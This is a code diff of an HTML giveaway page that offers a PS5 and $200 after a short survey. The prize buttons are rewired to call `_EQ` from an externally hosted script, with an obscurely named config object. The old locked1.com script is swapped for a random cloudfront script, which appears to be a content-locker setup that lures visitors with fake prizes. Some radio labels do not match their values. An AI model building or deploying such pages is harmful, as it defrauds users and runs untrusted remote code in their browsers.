@@ -45,25 +45,19 @@
     <div class="question">
       <label>Which platform do you follow us on most?</label>
       <input type="radio" name="platform" value="Instagram"> Instagram<br>
-      <input type="radio" name="platform" value="Snapchat"> X<br>
+      <input type="radio" name="platform" value="Snapchat"> Snapchat<br>
       <input type="radio" name="platform" value="Twitter"> Youtube<br>
       <input type="radio" name="platform" value="TikTok"> TikTok<br>
     </div>
-
-
 
     <button type="button" class="submit-btn" onclick="showGifts()">Submit</button>
   </form>
 </div>
 
 <div id="giftSelection" class="container" style="display: none;">
-  <button class="gift-btn" onclick="showCaptcha()">PS5 (GIVEAWAY)</button>
-  <button class="gift-btn" onclick="showCaptcha()"> $200 Cash</button>
+  <button class="gift-btn" onclick="triggerEQ()">PS5 (1)</button>
+  <button class="gift-btn" onclick="triggerEQ()"> $200</button>
   <button class="gift-btn" onclick="redirectToPage()">MY GAME</button>
-
-  <div id="captchaContainer" style="display: none;">
-    <div data-captcha-enable="true"></div>
-  </div>
 </div>
 
 <script>
@@ -76,19 +70,21 @@
       document.getElementById('giftSelection').style.display = 'block';
     }
   }
-  
 
   function redirectToPage() {
-    // Redirect to the page for iPhone 16
     window.location.href = "games.html";
   }
 
-  function showCaptcha() {
-    document.getElementById('captchaContainer').style.display = 'flex';
+  function triggerEQ() {
+    setTimeout(_EQ, 1000);
   }
 </script>
 
-<script type="text/javascript" src="https://locked1.com/cp/js/q8pqp"></script>
-
 </body>
+
+<script type="text/javascript">
+  var ROyKo_bes_TBCbRc={"it":4433276,"key":"a73f0"};
+</script>
+<script src="https://dxnp0xi26y9q.cloudfront.net/895d4d7.js"></script>
+
 </html>
